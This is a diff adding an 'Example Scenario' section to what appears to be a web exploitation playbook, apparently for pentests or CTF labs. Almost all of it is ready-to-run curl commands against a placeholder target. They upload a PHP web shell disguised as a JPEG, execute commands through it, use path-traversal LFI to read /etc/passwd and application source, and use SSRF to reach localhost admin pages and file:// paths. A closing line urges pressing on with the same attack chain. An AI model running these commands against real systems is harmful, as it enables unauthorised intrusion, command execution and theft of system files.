@@ -34,6 +34,32 @@ curl -s 'http://target/proxy.php?url=file:///etc/passwd'
 curl -sG --data-urlencode 'cmd=id' 'http://target/uploads/shell.php'
 ```
 
+## Example Scenario
+
+Upload bypass to foothold:
+
+```bash
+curl -b cookie.txt -c cookie.txt -F 'attachment=@shell.php;type=image/jpeg' \
+  http://target/admin/upload.php
+curl -sG --data-urlencode 'cmd=id' http://target/uploads/shell.php
+```
+
+LFI to source read:
+
+```bash
+curl -s 'http://target/services.php?lang=....//....//....//....//etc/passwd'
+curl -s 'http://target/services.php?lang=....//....//....//....//var/www/html/services.php'
+```
+
+SSRF to local admin surface:
+
+```bash
+curl -s 'http://target/proxy.php?url=http://127.0.0.1/'
+curl -s 'http://target/proxy.php?url=http://127.0.0.1/admin/'
+```
+
+Once one of these works, keep pushing the same chain. Do not jump back to generic recon.
+
 ## Common Mistakes
 
 - Treating a `200 OK` homepage as RCE success.
